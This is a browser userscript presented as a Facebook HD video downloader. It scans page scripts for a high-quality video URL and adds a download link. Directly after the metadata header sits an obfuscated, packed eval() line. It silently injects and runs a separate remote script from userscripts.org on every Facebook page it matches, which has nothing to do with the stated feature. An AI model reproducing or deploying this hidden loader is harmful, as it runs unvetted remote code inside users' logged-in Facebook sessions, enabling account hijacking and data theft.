// ==UserScript==
// @name			Facebook HD Video Downloader Plus
// @description		Adds a download link for Facebook videos. Works for HD videos as of October 2011.
// @author			styfle
// @include     http://facebook.com/photo.php*
// @include     http://*.facebook.com/photo.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include     https://facebook.com/photo.php*
// @include     https://*.facebook.com/photo.php*
// @include     http://facebook.com/video/*
// @include     http://*.facebook.com/video/*
// @include     https://facebook.com/video/*
// @include     https://*.facebook.com/video/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function appendDownloadLink() {
	var scripts = document.getElementsByTagName('script');
	var hd_url = null;

	for (var i=0; i<scripts.length; i++) {
		var html = scripts[i].innerHTML;
		var start = html.indexOf('["highqual_src');
		if (start != -1) {
			hd_url = html.substring(start, html.indexOf(']', start) + 1);
			break;
		}
	}

	var hd_link = document.createElement('a');
	hd_link.setAttribute('id', 'hd_link');
	hd_link.setAttribute('target', '_blank');
	hd_link.setAttribute('class', 'fbPhotosPhotoActionsItem');

	if (!hd_url) {
		hd_link.innerHTML = 'HD download not available';
		hd_link.style.setProperty('color', 'gray');
		hd_link.style.setProperty('text-decoration', 'none');
		hd_link.style.setProperty('cursor', 'default');
	} else {
/*
		hd_url = hd_url.substring(hd_url.indexOf('"http')+1, hd_url.indexOf('")'));

		hd_url = hd_url.replace(/\\u([\d\w]{4})/gi,
			function(match, grp) {
				return String.fromCharCode(parseInt(grp, 16));
			}
		);
*/

		hd_url = JSON.parse(hd_url)[1];

		hd_link.setAttribute('href', unescape(hd_url));
		hd_link.setAttribute('title', 'Right click and save as...');
		hd_link.innerHTML = 'Download HD Video';

	}

	var sidebar = document.getElementById('fbPhotoPageActions');
	sidebar.appendChild(hd_link);

}

window.setTimeout(appendDownloadLink, 2000);